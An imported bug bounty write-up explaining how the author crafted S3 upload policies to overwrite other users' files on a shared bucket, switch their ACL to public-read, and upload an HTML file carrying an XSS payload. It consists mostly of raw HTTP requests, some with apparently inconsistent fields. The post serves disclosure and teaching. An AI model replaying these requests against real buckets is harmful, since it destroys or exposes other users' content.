---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-12-30_abusing-acl-permissions-to-overwrite-other-users-uploaded-filesvideos-on-s3-buck.md
original_filename: 2018-12-30_abusing-acl-permissions-to-overwrite-other-users-uploaded-filesvideos-on-s3-buck.md
title: Abusing ACL Permissions to Overwrite other User’s Uploaded Files/Videos on
  s3 Bucket
category: documents
detected_topics:
- cloud-security
- idor
- access-control
- command-injection
- file-upload
- api-security
tags:
- imported
- documents
- cloud-security
- idor
- access-control
- command-injection
- file-upload
- api-security
language: en
raw_sha256: 2787afbea0fa5cefc91ac1096131476651e5773ccfeaa451b75aa84f426713a8
text_sha256: 7811be07deaacfadc31b4692e0596ee839be785708b7dc5642bd1cdc1023613d
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: true
---

# Abusing ACL Permissions to Overwrite other User’s Uploaded Files/Videos on s3 Bucket

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-12-30_abusing-acl-permissions-to-overwrite-other-users-uploaded-filesvideos-on-s3-buck.md
- Source Type: markdown
- Detected Topics: cloud-security, idor, access-control, command-injection, file-upload, api-security
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: True
- Raw SHA256: `2787afbea0fa5cefc91ac1096131476651e5773ccfeaa451b75aa84f426713a8`
- Text SHA256: `7811be07deaacfadc31b4692e0596ee839be785708b7dc5642bd1cdc1023613d`


## Content

---
title: "Abusing ACL Permissions to Overwrite other User’s Uploaded Files/Videos on s3 Bucket"
url: "https://medium.com/@armaanpathan/abusing-acl-permissions-to-overwrite-other-users-uploaded-files-videos-on-s3-bucket-162c8877728"
authors: ["Armaan Pathan (@armaancrockroax)"]
bugs: ["Unrestricted file upload", "Broken authorization"]
publication_date: "2018-12-30"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5499
scraped_via: "browseros"
---

# Abusing ACL Permissions to Overwrite other User’s Uploaded Files/Videos on s3 Bucket

Abusing ACL Permissions to Overwrite other User’s Uploaded Files/Videos on s3 Bucket
Armaan Pathan
Follow
4 min read
·
Dec 31, 2018

218

Hi all, Today I am writing a blog about on a recent finding on 
HackerOne
’s one of the program.
I was looking for IDORs in an application so I started fuzzing each and every request of an application, I got mentioned request

POST /api-2.0/s3-upload-signatures HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.example.com/home/xxx/test/upload
X-Requested-With: XMLHttpRequest, XMLHttpRequest
Cache-Control: no-cache
Content-Type: application/json; charset=utf-8
Authorization: Bearer :
X-Example-Authorization: Bearer 
Content-Length: 311
Connection: close
Cookie: {}
{"expiration":"2018-12-18T11:58:24.376Z","conditions":[{"acl":"private"},{"bucket":"example-web-upload-bucket"},{"Content-Type":""},{"success_action_status":"200"},{"key":"a4fe6f57-a208-43a8-8aab-be2ac6ad06f9.jpg"},{"x-amz-meta-qqfilename":"1.jpg"},["content-length-range","1","9007199254740992"]]}

So basically this was a request which is used to set a policy to upload a files on a s3 bucket and after this request i got below mentioned photo/video upload request.

POST / HTTP/1.1
Host: example-web-upload-bucket.s3.amazonaws.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.example.com/
Content-Type: multipart/form-data; boundary=---------------------------1268156844136880633597812894
Content-Length: 1716
Origin: https://www.example.com
Connection: close
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="key"
a4fe6f57-a208-43a8-8aab-be2ac6ad06f9.jpg
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="***REDACTED-AWS-KEY***Id"
***REDACTED-AWS-KEY***
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="Content-Type"
text/html
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="success_action_status"
200
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="acl"
public-read
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="x-amz-meta-qqfilename"
1.jpg
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="policy"
xxxxxxxxxxxxx{this is policy} 
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="signature"
n7QQDjsmZUL5fQMOXO0vvAF98kg=
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="file"; filename="1.jpg"
Content-Type:
-----------------------------1268156844136880633597812894--

This request was using the file upload policies which were generated in first request. So I tried to find that which other files exists on the s3 buckets which are currently used in an application, once i came to know some of the photo/video names which are on the same bucket, I tried to make a custom policy to upload unrestricted files on the bucket which will overwrite the existing files and also the ACL permissions were private so i wanted to replace it with public-read so each and every user on an application will get affected of this attack, So i tried to create a custom policy by changing below mentioned values in request.

POST / HTTP/1.1
Host: example-web-upload-bucket.s3.amazonaws.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.example.com/
Content-Type: multipart/form-data; boundary=---------------------------1268156844136880633597812894
Content-Length: 1716
Origin: https://www.example.com
Connection: close
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="key"
a4fe6f57-a208-43a8-8aab-be2ac6ad06f9.jpg
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="***REDACTED-AWS-KEY***Id"
***REDACTED-AWS-KEY***
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="Content-Type"

-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="success_action_status"
200
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="acl"
private
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="x-amz-meta-qqfilename"
1.jpg
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="policy"
xxxxxxxxxxxxx{this is policy}
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="signature"
n7QQDjsmZUL5fQMOXO0vvAF98kg=
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="file"; filename="1.jpg"
Content-Type:
-----------------------------1268156844136880633597812894--

As you can see in the screenshot, it has created the custom policy to upload html files which will over write the existing files on the server.

Get Armaan Pathan’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I used to the policy to file upload request, and the request looked like this.

POST / HTTP/1.1
Host: example-web-upload-bucket.s3.amazonaws.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.example.com/
Content-Type: multipart/form-data; boundary=---------------------------1268156844136880633597812894
Content-Length: 1716
Origin: https://www.example.com
Connection: close
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="key"
a4fe6f57-a208-43a8-8aab-be2ac6ad06f9.jpg
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="***REDACTED-AWS-KEY***Id"
***REDACTED-AWS-KEY***
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="Content-Type"
text/html
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="success_action_status"
200
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="acl"
public-read
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="x-amz-meta-qqfilename"
1.html
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="policy"
xxxxxxxxxxxxx{this is policy}
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="signature"
n7QQDjsmZUL5fQMOXO0vvAF98kg=
-----------------------------1268156844136880633597812894
Content-Disposition: form-data; name="file"; filename="1.html"
Content-Type: text/html
<svg/onload=prompt`1`;>
-----------------------------1268156844136880633597812894--

Now this request has uploaded unrestricted file on bucket by over writing the existing file and also abused the ACL permissions by giving the file public-read permissions.

Press enter or click to view image in full size

Thats it :D
Thanks guys for reading. have a great day ahead.
